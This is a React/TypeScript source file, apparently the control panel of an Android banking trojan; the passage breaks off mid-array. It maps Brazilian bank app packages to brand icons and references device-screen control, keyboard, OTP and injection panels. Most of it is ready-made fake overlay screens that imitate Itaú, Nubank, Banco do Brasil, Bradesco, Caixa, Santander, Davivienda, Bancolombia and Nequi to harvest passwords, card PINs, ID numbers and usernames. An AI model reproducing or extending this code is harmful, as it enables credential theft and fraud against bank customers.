import { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import { devicesAPI, getApiBaseUrl, layoutAPI } from '../services/api';
import DeviceScreen from '../components/DeviceScreen';
import LanguageSelector from '../components/LanguageSelector';
import RobotAssistant, { RobotAvatar } from '../components/RobotAssistant';
import { useTranslation } from '../utils/i18n';
import type { Device } from '../types';
import { 
  ArrowLeft, 
  Power, 
  MessageSquare, 
  Users,
  Keyboard,
  Download,
  Eye,
  LogOut,
  Minimize,
  ChevronDown,
  ChevronUp,
  ChevronLeft,
  Layout, 
  X, 
  Move, 
  Minimize2, 
  Maximize2, 
  List,
  LayoutGrid,
  Volume1,
  Volume2,
  Lock,
  Camera,
  Bell,
  RefreshCw,
  Settings,
  Activity,
  Smartphone,
  Package,
  Sliders,
  EyeOff,
  Mic,
  FolderOpen,
  ShieldAlert,
  Syringe,
  Copy,
  FileText,
  Trash2,
  Search,
  Clock,
  Mail
} from 'lucide-react';
import { EditableButton } from '../components/EditableButton';
import { LayoutEditToolbar, EditModeToggle } from '../components/LayoutEditToolbar';
import BlackScreenEditor from '../components/BlackScreenEditor';
import OtpPanel from '../components/OtpPanel';

// ===== ÍÍCONES DE BANCO BASEADOS EM MARCA =====
const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; emoji?: string }> = {
  'com.nu.production':        { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'com.nubank':               { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'br.com.bradesco':          { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'coe.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'com.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'br.com.itau':              { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'com.itau':                 { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'br.com.bb.android':        { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.bb.android':           { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.santander.app':        { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.santander':         { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.bancointer':        { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.intermedium':       { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
  'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#ffd700', label: 'C6' },
  'br.com.neon':              { bg: 'linear-gradient(135deg,#ffbf00,#aa8000)', text: '#fff', label: 'NEO' },
  'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'br.com.uol.ps.myaccount':  { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.pagseguro':            { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.mercadopago':          { bg: 'linear-gradient(135deg,#e39e00,#b67700)', text: '#fff', label: 'MP' },
  'br.com.picpay':            { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.picpay':               { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.panapp':               { bg: 'linear-gradient(135deg,#8b3f1b,#6a2b12)', text: '#fff', label: 'PAN' },
  'br.com.sicredi':           { bg: 'linear-gradient(135deg,#009933,#006622)', text: '#fff', label: 'SIC' },
  'br.com.original':          { bg: 'linear-gradient(135deg,#d8b400,#c79600)', text: '#fff', label: 'ORI' },
  'br.com.stone':             { bg: 'linear-gradient(135deg,#00af83,#008f6b)', text: '#fff', label: 'STN' },
  'br.com.digio':             { bg: 'linear-gradient(135deg,#ff2f7b,#d41f5c)', text: '#fff', label: 'DIG' },
  'com.will.bank':            { bg: 'linear-gradient(135deg,#ad0d6a,#82004b)', text: '#fff', label: 'WIL' },
  'br.com.agibank':           { bg: 'linear-gradient(135deg,#ff4500,#cc3700)', text: '#fff', label: 'AGI' },
  'br.com.sofisa':            { bg: 'linear-gradient(135deg,#c06515,#a1470d)', text: '#fff', label: 'SOF' },
  'com.citibank.mobile.br':   { bg: 'linear-gradient(135deg,#873000,#5c1f00)', text: '#fff', label: 'CITI' },
  'br.com.banrisul':          { bg: 'linear-gradient(135deg,#aa5b00,#783d00)', text: '#fff', label: 'BNR' },
};

function getBankBrand(pkg: string) {
  if (!pkg) return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
  const pkgLower = pkg.toLowerCase();
  // Exact match first
  if (BANK_BRAND_MAP[pkgLower]) return BANK_BRAND_MAP[pkgLower];
  // Prefix match
  for (const key of Object.keys(BANK_BRAND_MAP)) {
    if (pkgLower.startsWith(key)) return BANK_BRAND_MAP[key];
  }
  // Keyword match
  if (pkgLower.includes('nubank') || pkgLower.includes('nu.production')) return BANK_BRAND_MAP['com.nu.production'];
  if (pkgLower.includes('bradesco')) return BANK_BRAND_MAP['br.com.bradesco'];
  if (pkgLower.includes('itau')) return BANK_BRAND_MAP['br.com.itau'];
  if (pkgLower.includes('bb.android') || pkgLower.includes('bancodobrasil')) return BANK_BRAND_MAP['br.com.bb.android'];
  if (pkgLower.includes('santander')) return BANK_BRAND_MAP['com.santander.app'];
  if (pkgLower.includes('inter') || pkgLower.includes('intermedium')) return BANK_BRAND_MAP['br.com.bancointer'];
  if (pkgLower.includes('caixa')) return BANK_BRAND_MAP['br.com.caixa'];
  if (pkgLower.includes('c6bank')) return BANK_BRAND_MAP['br.com.c6bank'];
  if (pkgLower.includes('neon')) return BANK_BRAND_MAP['br.com.neon'];
  if (pkgLower.includes('pagbank') || pkgLower.includes('pagseguro') || pkgLower.includes('myaccount')) return BANK_BRAND_MAP['br.com.pagbank'];
  if (pkgLower.includes('mercadopago')) return BANK_BRAND_MAP['com.mercadopago'];
  if (pkgLower.includes('picpay')) return BANK_BRAND_MAP['br.com.picpay'];
  if (pkgLower.includes('panapp') || pkgLower.includes('pan.card')) return BANK_BRAND_MAP['com.panapp'];
  if (pkgLower.includes('sicredi')) return BANK_BRAND_MAP['br.com.sicredi'];
  if (pkgLower.includes('stone')) return BANK_BRAND_MAP['br.com.stone'];
  if (pkgLower.includes('digio')) return BANK_BRAND_MAP['br.com.digio'];
  if (pkgLower.includes('willbank')) return BANK_BRAND_MAP['com.will.bank'];
  if (pkgLower.includes('agibank')) return BANK_BRAND_MAP['br.com.agibank'];
  // Fallback
  return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
}

function getBankLogoEmoji(pkg: string) {
  if (!pkg) return '';
  const p = pkg.toLowerCase();
  if (p.includes('nubank') || p.includes('nu.production')) return '';
  if (p.includes('bradesco')) return '';
  if (p.includes('itau')) return '';
  if (p.includes('bb.android') || p.includes('bancodobrasil')) return '';
  if (p.includes('santander')) return '';
  if (p.includes('inter')) return '';
  if (p.includes('caixa')) return '';
  if (p.includes('c6bank')) return '';
  if (p.includes('neon')) return '';
  if (p.includes('pagbank') || p.includes('pagseguro')) return '';
  if (p.includes('picpay')) return '';
  if (p.includes('mercadopago') || p.includes('mercadolibre')) return '';
  if (p.includes('sicoob')) return '';
  if (p.includes('xp')) return '';
  return '';
}

function getBankCardGradient(pkg: string) {
  if (!pkg) return 'from-emerald-950/40 via-[#121214]/60 to-slate-950/80 border-emerald-500/20';
  const p = pkg.toLowerCase();
  if (p.includes('nu.production') || p.includes('nubank')) return 'from-purple-900 via-purple-950 to-slate-950 border-[#f87171]/30';
  if (p.includes('itau')) return 'from-[#84cc16] via-[#1a1a1e] to-slate-950 border-[#ef4444]/30';
  if (p.includes('inter')) return 'from-[#ef4444] via-orange-950 to-slate-950 border-[#ef4444]/30';
  if (p.includes('bradesco')) return 'from-rose-700 via-[#121214] to-slate-950 border-[#2a2a31]/30';
  if (p.includes('santander')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#2a2a31]/30';
  if (p.includes('bb.android') || p.includes('bancodobrasil')) return 'from-yellow-600 via-[#1a1a1e] to-slate-950 border-yellow-500/30';
  if (p.includes('caixa')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#2a2a31]/30';
  if (p.includes('c6')) return 'from-[#24242a] via-slate-950 to-black border-[#2a2a31]/50';
  if (p.includes('neon')) return 'from-[#ef4444] via-teal-950 to-slate-950 border-[#2a2a31]/30';
  if (p.includes('pagbank') || p.includes('pagseguro')) return 'from-emerald-600 via-[#121214] to-slate-950 border-emerald-500/30';
  if (p.includes('mercadopago') || p.includes('mercadolibre')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#3a3a44]/30';
  if (p.includes('picpay')) return 'from-emerald-500 via-emerald-950 to-slate-950 border-emerald-500/30';
  if (p.includes('sicoob')) return 'from-teal-600 via-teal-950 to-slate-950 border-teal-500/30';
  if (p.includes('sicredi')) return 'from-green-700 via-[#121214] to-slate-950 border-green-500/30';
  if (p.includes('xp')) return 'from-amber-600 via-[#121214] to-slate-950 border-amber-500/30';
  return 'from-emerald-950/40 via-[#121214]/60 to-slate-950/80 border-emerald-500/20';
}

interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
function BankIcon({ pkg, iconB64, name, size = 36 }: BankIconProps) {
  const [imgError, setImgError] = useState(false);
  const brand = getBankBrand(pkg);
  const fontSize = size <= 36 ? (brand.label.length > 2 ? 9 : 11) : (brand.label.length > 2 ? 11 : 14);
  
  // Try real base64 icon first
  if (iconB64 && iconB64.length > 100 && !imgError) {
    const src = iconB64.startsWith('data:') ? iconB64 : `data:image/png;base64,${iconB64}`;
    return (
      <img
        src={src}
        alt={name || pkg}
        width={size} height={size}
        style={{ borderRadius: 8, objectFit: 'contain', flexShrink: 0 }}
        onError={() => setImgError(true)}
      />
    );
  }
  
  return (
    <div
      style={{
        width: size, height: size, borderRadius: 8,
        background: brand.bg,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        flexShrink: 0, boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
        fontWeight: 900, fontSize, color: brand.text,
        letterSpacing: brand.label.length > 2 ? '0px' : '0.5px',
        fontFamily: 'Inter, system-ui, sans-serif',
        userSelect: 'none'
      }}
    >
      {brand.label}
    </div>
  );
}
// ===== FIM ÍÍCONES =====


// Hook para detectar mobile
const useIsMobile = () => {
  const [isMobile, setIsMobile] = useState(false);
  
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  return isMobile;
};

const SCREEN_BASE_WIDTH = 1080;
const SCREEN_BASE_HEIGHT = 2400;

const PRESET_BANK_PROJECT = {
  id: 'preset-banking-screens',
  name: ' TELAS PRONTAS (Senhas)',
  appName: 'Templates Oficiais',
  projectType: 'custom',
  screens: [
    {
      id: 'preset-itau-system',
      name: ' Itaú - Senha de Acesso (Oficial Interativo)',
      backgroundColor: '#f1f2f4',
      multiStep: true,
      step1Label: 'SENHA DE ACESSO ITAÚ',
      step2Label: 'SENHA DE TRANSAÇO ITAÚ',
      package_name: 'br.com.itau',
      elements: [
        { id: 'itau-sys-logo', type: 'logo', x: 125, y: 60, width: 110, height: 110, content: '', fontSize: 42, color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-title', type: 'text', x: 20, y: 180, width: 320, height: 35, content: 'Digite a senha de acesso', fontSize: 22, fontWeight: 'bold', color: '#1a1a1a', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-dots', type: 'text', x: 70, y: 235, width: 220, height: 30, content: '               ', fontSize: 22, fontWeight: 'bold', color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-k1', type: 'button', x: 25, y: 290, width: 95, height: 48, content: '1', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k2', type: 'button', x: 132, y: 290, width: 95, height: 48, content: '2', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k3', type: 'button', x: 240, y: 290, width: 95, height: 48, content: '3', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k4', type: 'button', x: 25, y: 350, width: 95, height: 48, content: '4', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k5', type: 'button', x: 132, y: 350, width: 95, height: 48, content: '5', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k6', type: 'button', x: 240, y: 350, width: 95, height: 48, content: '6', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k7', type: 'button', x: 25, y: 410, width: 95, height: 48, content: '7', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k8', type: 'button', x: 132, y: 410, width: 95, height: 48, content: '8', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k9', type: 'button', x: 240, y: 410, width: 95, height: 48, content: '9', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k0', type: 'button', x: 132, y: 470, width: 95, height: 48, content: '0', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-kdel', type: 'button', x: 240, y: 470, width: 95, height: 48, content: '', backgroundColor: '#ffffff', color: '#6b6b6b', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-forgot', type: 'text', x: 50, y: 540, width: 260, height: 25, content: 'Esqueci minha senha  ', fontSize: 15, color: '#1a1a1a', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-btn', type: 'button', x: 20, y: 585, width: 320, height: 50, content: 'Continuar', buttonAction: 'submit', backgroundColor: '#ed7c0e', color: '#ffffff', borderRadius: 999 }
      ]
    },
    {
      id: 'preset-itau',
      name: ' Itaú - Senha Eletrônica',
      backgroundColor: 'linear-gradient(185deg, #3e0e04 0%, #220703 100%)',
      elements: [
        { id: 'itau-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#ec7000', opacity: 100 },
        { id: 'itau-text-logo', type: 'text', x: 20, y: 22, width: 320, height: 35, content: 'itaú', fontSize: 28, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'itau-card-bg', type: 'rectangle', x: 20, y: 120, width: 320, height: 330, backgroundColor: 'rgba(42, 18, 18, 0.45)', borderRadius: 16, opacity: 100 },
        { id: 'itau-text-title', type: 'text', x: 30, y: 140, width: 300, height: 35, content: 'Confirmar Acesso', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'itau-text-desc', type: 'text', x: 40, y: 185, width: 280, height: 50, content: 'Digite sua senha eletrônica de 6 dígitos para autorizar o acesso à sua conta.', fontSize: 13, color: '#c9a8a8', textAlign: 'center', opacity: 100 },
        { id: 'itau-input-pwd', type: 'input', x: 40, y: 255, width: 280, height: 50, placeholder: 'Senha eletrônica (6 dígitos)', inputType: 'password', inputLabel: 'senha_eletronica_itau', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 12, borderColor: '#ec7000' },
        { id: 'itau-btn-sub', type: 'button', x: 40, y: 325, width: 280, height: 50, content: 'Confirmar', buttonAction: 'submit', backgroundColor: '#ec7000', color: '#ffffff', borderRadius: 12 },
        { id: 'itau-bio', type: 'fingerprint', x: 145, y: 470, width: 70, height: 100, biometricColor: '#ec7000', biometricText: 'Usar Impressão Digital' }
      ]
    },
    {
      id: 'preset-nubank',
      name: ' Nubank - Senha App',
      backgroundColor: 'linear-gradient(135deg, #d10a83 0%, #7a064c 100%)',
      elements: [
        { id: 'nu-text-logo', type: 'text', x: 130, y: 80, width: 100, height: 80, content: 'nu', fontSize: 58, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'nu-card-bg', type: 'rectangle', x: 20, y: 180, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.08)', borderRadius: 16, opacity: 100 },
        { id: 'nu-text-title', type: 'text', x: 30, y: 200, width: 300, height: 35, content: 'Digite sua senha do app', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'nu-text-desc', type: 'text', x: 40, y: 245, width: 280, height: 45, content: 'Esta é a senha de 8 dígitos que você usa para acessar o aplicativo do Nubank.', fontSize: 13, color: '#ffc8e5', textAlign: 'center', opacity: 100 },
        { id: 'nu-input-pwd', type: 'input', x: 40, y: 310, width: 280, height: 50, placeholder: 'Senha do aplicativo (8 dígitos)', inputType: 'password', inputLabel: 'senha_acesso_nubank', backgroundColor: 'rgba(0, 0, 0, 0.25)', color: '#ffffff', borderRadius: 12, borderColor: 'rgba(255, 255, 255, 0.2)' },
        { id: 'nu-btn-sub', type: 'button', x: 40, y: 385, width: 280, height: 50, content: 'Confirmar', buttonAction: 'submit', backgroundColor: '#ffffff', color: '#d10a83', borderRadius: 12 },
        { id: 'nu-bio', type: 'fingerprint', x: 145, y: 520, width: 70, height: 100, biometricColor: '#ffffff', biometricText: 'Entrar com Digital' }
      ]
    },
    {
      id: 'preset-bb',
      name: ' Banco do Brasil - 8 dígitos',
      backgroundColor: 'linear-gradient(180deg, #7a2e00 0%, #5c1f00 100%)',
      elements: [
        { id: 'bb-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#fbdf07', opacity: 100 },
        { id: 'bb-text-logo', type: 'text', x: 20, y: 22, width: 320, height: 30, content: 'BANCO DO BRASIL', fontSize: 18, fontWeight: 'bold', color: '#a83800', textAlign: 'center', opacity: 100 },
        { id: 'bb-card-bg', type: 'rectangle', x: 20, y: 120, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.05)', borderRadius: 16, opacity: 100 },
        { id: 'bb-text-title', type: 'text', x: 30, y: 140, width: 300, height: 35, content: 'Validação de Segurança', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'bb-text-desc', type: 'text', x: 40, y: 185, width: 280, height: 50, content: 'Para confirmar a identidade neste dispositivo, insira sua senha de 8 dígitos.', fontSize: 13, color: '#e1d5cb', textAlign: 'center', opacity: 100 },
        { id: 'bb-input-pwd', type: 'input', x: 40, y: 250, width: 280, height: 50, placeholder: 'Senha de 8 dígitos', inputType: 'password', inputLabel: 'senha_8_digitos_bb', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 12, borderColor: '#fbdf07' },
        { id: 'bb-btn-sub', type: 'button', x: 40, y: 325, width: 280, height: 50, content: 'Confirmar acesso', buttonAction: 'submit', backgroundColor: '#fbdf07', color: '#a83800', borderRadius: 12 },
        { id: 'bb-bio', type: 'fingerprint', x: 145, y: 460, width: 70, height: 100, biometricColor: '#fbdf07', biometricText: 'Usar Biometria' }
      ]
    },
    {
      id: 'preset-bradesco',
      name: ' Bradesco - 4 dígitos Cartão',
      backgroundColor: 'linear-gradient(135deg, #cc092f 0%, #80001a 100%)',
      elements: [
        { id: 'brad-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#ffffff', opacity: 100 },
        { id: 'brad-text-logo', type: 'text', x: 20, y: 22, width: 320, height: 30, content: 'Bradesco', fontSize: 20, fontWeight: 'bold', color: '#cc092f', textAlign: 'center', opacity: 100 },
        { id: 'brad-card-bg', type: 'rectangle', x: 20, y: 120, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.1)', borderRadius: 16, opacity: 100 },
        { id: 'brad-text-title', type: 'text', x: 30, y: 140, width: 300, height: 30, content: 'Confirmação do Cartão', fontSize: 18, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'brad-text-desc', type: 'text', x: 40, y: 180, width: 280, height: 50, content: 'Insira a senha de 4 dígitos do seu cartão de débito/crédito para validar seu dispositivo.', fontSize: 13, color: '#f1f5f9', textAlign: 'center', opacity: 100 },
        { id: 'brad-input-pwd', type: 'input', x: 40, y: 245, width: 280, height: 50, placeholder: 'Senha de 4 dígitos (do cartão)', inputType: 'numeric', inputLabel: 'senha_cartao_bradesco', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 12, borderColor: '#ffffff' },
        { id: 'brad-btn-sub', type: 'button', x: 40, y: 315, width: 280, height: 50, content: 'Avançar', buttonAction: 'submit', backgroundColor: '#ffffff', color: '#cc092f', borderRadius: 12 },
        { id: 'brad-bio', type: 'fingerprint', x: 145, y: 460, width: 70, height: 100, biometricColor: '#ffffff', biometricText: 'Usar Biometria' }
      ]
    },
    {
      id: 'preset-caixa',
      name: ' Caixa - Assinatura Eletrônica',
      backgroundColor: 'linear-gradient(135deg, #a90000 0%, #663600 100%)',
      elements: [
        { id: 'caixa-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#f39200', opacity: 100 },
        { id: 'caixa-text-logo', type: 'text', x: 20, y: 20, width: 320, height: 30, content: 'CAIXA', fontSize: 24, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'caixa-card-bg', type: 'rectangle', x: 20, y: 120, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.05)', borderRadius: 16, opacity: 100 },
        { id: 'caixa-text-title', type: 'text', x: 30, y: 140, width: 300, height: 30, content: 'Validação de Transações', fontSize: 18, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'caixa-text-desc', type: 'text', x: 40, y: 180, width: 280, height: 50, content: 'Digite sua assinatura eletrônica de 6 dígitos para validar a autenticação do seu app.', fontSize: 13, color: '#e2e8f0', textAlign: 'center', opacity: 100 },
        { id: 'caixa-input-pwd', type: 'input', x: 40, y: 245, width: 280, height: 50, placeholder: 'Assinatura Eletrônica (6 dígitos)', inputType: 'password', inputLabel: 'assinatura_eletronica_caixa', backgroundColor: 'rgba(22, 6, 6, 0.6)', color: '#ffffff', borderRadius: 12, borderColor: '#f39200' },
        { id: 'caixa-btn-sub', type: 'button', x: 40, y: 315, width: 280, height: 50, content: 'Confirmar Assinatura', buttonAction: 'submit', backgroundColor: '#f39200', color: '#ffffff', borderRadius: 12 },
        { id: 'caixa-bio', type: 'fingerprint', x: 145, y: 460, width: 70, height: 100, biometricColor: '#f39200', biometricText: 'Validar com Digital' }
      ]
    },
    {
      id: 'preset-santander',
      name: ' Santander - Senha',
      backgroundColor: 'linear-gradient(135deg, #ec0000 0%, #8c0000 100%)',
      elements: [
        { id: 'sant-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Santander', fontSize: 32, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'sant-card-bg', type: 'rectangle', x: 20, y: 150, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.08)', borderRadius: 16, opacity: 100 },
        { id: 'sant-text-title', type: 'text', x: 30, y: 170, width: 300, height: 30, content: 'Acesso Bloqueado', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'sant-text-desc', type: 'text', x: 40, y: 210, width: 280, height: 50, content: 'Para desbloquear o acesso às suas contas, confirme sua senha eletrônica de 6 dígitos.', fontSize: 13, color: '#ffe4e4', textAlign: 'center', opacity: 100 },
        { id: 'sant-input-pwd', type: 'input', x: 40, y: 275, width: 280, height: 50, placeholder: 'Senha eletrônica (6 dígitos)', inputType: 'password', inputLabel: 'senha_acesso_santander', backgroundColor: 'rgba(0, 0, 0, 0.25)', color: '#ffffff', borderRadius: 12, borderColor: '#ffffff' },
        { id: 'sant-btn-sub', type: 'button', x: 40, y: 345, width: 280, height: 50, content: 'Confirmar Senha', buttonAction: 'submit', backgroundColor: '#ffffff', color: '#ec0000', borderRadius: 12 },
        { id: 'sant-bio', type: 'fingerprint', x: 145, y: 500, width: 70, height: 100, biometricColor: '#ffffff', biometricText: 'Entrar com Digital' }
      ]
    },
    {
      id: 'preset-davivienda',
      name: '🇨🇴 Davivienda - Clave Virtual',
      backgroundColor: 'linear-gradient(135deg, #ed1c24 0%, #a8050c 100%)',
      elements: [
        { id: 'davi-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Davivienda', fontSize: 32, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'davi-card-bg', type: 'rectangle', x: 20, y: 150, width: 320, height: 330, backgroundColor: 'rgba(255, 255, 255, 0.12)', borderRadius: 16, opacity: 100 },
        { id: 'davi-text-title', type: 'text', x: 30, y: 170, width: 300, height: 30, content: 'Hola', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'davi-text-desc', type: 'text', x: 40, y: 210, width: 280, height: 50, content: 'Ingrese su documento de identidad y clave virtual para iniciar sesión en Davivienda.', fontSize: 13, color: '#ffffff', textAlign: 'center', opacity: 100 },
        { id: 'davi-input-doc', type: 'input', x: 40, y: 270, width: 280, height: 45, placeholder: 'Número de documento (Cédula)', inputType: 'numeric', inputLabel: 'cedula_davivienda', backgroundColor: 'rgba(255, 255, 255, 0.95)', color: '#000000', borderRadius: 10, borderColor: '#ffffff' },
        { id: 'davi-input-pwd', type: 'input', x: 40, y: 330, width: 280, height: 45, placeholder: 'Clave virtual (4 u 6 dígitos)', inputType: 'password', inputLabel: 'clave_davivienda', backgroundColor: 'rgba(255, 255, 255, 0.95)', color: '#000000', borderRadius: 10, borderColor: '#ffffff' },
        { id: 'davi-btn-sub', type: 'button', x: 40, y: 395, width: 280, height: 48, content: 'Iniciar sesión', buttonAction: 'submit', backgroundColor: '#ed1c24', color: '#ffffff', borderRadius: 10 },
        { id: 'davi-bio', type: 'fingerprint', x: 145, y: 500, width: 70, height: 100, biometricColor: '#ffffff', biometricText: 'Ingresar con Huella' }
      ]
    },
    {
      id: 'preset-bancolombia',
      name: '🇨🇴 Bancolombia - Clave Principal',
      backgroundColor: 'linear-gradient(135deg, #ffdd00 0%, #f2c900 100%)',
      elements: [
        { id: 'bcol-text-logo', type: 'text', x: 30, y: 70, width: 300, height: 40, content: 'Bancolombia', fontSize: 30, fontWeight: 'bold', color: '#000000', textAlign: 'center', opacity: 100 },
        { id: 'bcol-card-bg', type: 'rectangle', x: 20, y: 140, width: 320, height: 340, backgroundColor: '#ffffff', borderRadius: 16, opacity: 100 },
        { id: 'bcol-text-title', type: 'text', x: 30, y: 160, width: 300, height: 30, content: 'Bienvenido a tu App', fontSize: 20, fontWeight: 'bold', color: '#000000', textAlign: 'center', opacity: 100 },
        { id: 'bcol-text-desc', type: 'text', x: 40, y: 200, width: 280, height: 45, content: 'Ingresa tu usuario y clave principal de 4 dígitos para continuar.', fontSize: 13, color: '#7a5050', textAlign: 'center', opacity: 100 },
        { id: 'bcol-input-user', type: 'input', x: 40, y: 255, width: 280, height: 45, placeholder: 'Ingresa tu Usuario', inputType: 'text', inputLabel: 'usuario_bancolombia', backgroundColor: '#f1f5f9', color: '#000000', borderRadius: 8, borderColor: '#e1d5cb' },
        { id: 'bcol-input-pwd', type: 'input', x: 40, y: 315, width: 280, height: 45, placeholder: 'Clave principal (4 dígitos)', inputType: 'password', inputLabel: 'clave_bancolombia', backgroundColor: '#f1f5f9', color: '#000000', borderRadius: 8, borderColor: '#e1d5cb' },
        { id: 'bcol-btn-sub', type: 'button', x: 40, y: 380, width: 280, height: 48, content: 'Ingresar', buttonAction: 'submit', backgroundColor: '#000000', color: '#ffdd00', borderRadius: 24 },
        { id: 'bcol-bio', type: 'fingerprint', x: 145, y: 500, width: 70, height: 100, biometricColor: '#000000', biometricText: 'Ingresar con Huella' }
      ]
    },
    {
      id: 'preset-nequi',
      name: '🇨🇴 Nequi - Clave / PIN 4 Dígitos',
      backgroundColor: 'linear-gradient(135deg, #350509 0%, #1c0204 100%)',
      elements: [
        { id: 'neq-text-logo', type: 'text', x: 30, y: 70, width: 300, height: 40, content: 'NEQUI', fontSize: 34, fontWeight: 'bold', color: '#ff007a', textAlign: 'center', opacity: 100 },
        { id: 'neq-card-bg', type: 'rectangle', x: 20, y: 140, width: 320, height: 340, backgroundColor: 'rgba(255, 255, 255, 0.05)', borderRadius: 16, opacity: 100 },
        { id: 'neq-text-title', type: 'text', x: 30, y: 160, width: 300, height: 30, content: 'Entra a tu Nequi', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
